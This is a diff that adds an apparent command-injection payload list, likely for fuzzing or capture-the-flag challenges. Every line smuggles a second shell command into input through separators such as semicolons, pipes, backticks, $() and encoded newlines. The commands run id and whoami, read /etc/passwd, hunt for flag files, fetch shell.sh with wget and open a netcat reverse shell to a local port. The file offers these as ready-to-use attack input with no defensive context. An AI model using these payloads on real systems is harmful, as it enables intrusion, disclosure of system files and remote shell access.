@@ -1,0 +1,37 @@
+; id
+| id
+&& id
+|| id
+`id`
+$(id)
+; whoami
+| whoami
+&& whoami
+|| whoami
+; cat /etc/passwd
+| cat /etc/passwd
+; ls -la /
+| ls -la /
+; ls -la /root
+| ls -la /home
+; cat /flag.txt 2>/dev/null
+| cat /flag 2>/dev/null
+; find / -name flag* 2>/dev/null
+| find / -name flag* 2>/dev/null
+; curl http://127.0.0.1:8080/
+| curl http://127.0.0.1:8080/
+; wget http://127.0.0.1/shell.sh -O /tmp/shell.sh
+| nc -e /bin/sh 127.0.0.1 4444
+\n id
+\nid
+&id
+%0aid
+%0Aid
+%0Did
+%0a%0dcat /etc/passwd
+%0a%0did
+%0a%0dwhoami
+;python3 -c 'import os;os.system("id")'
+|python3 -c 'import os;os.system("id")'
+;python -c 'import os;os.system("id")'
+|python -c 'import os;os.system("id")'
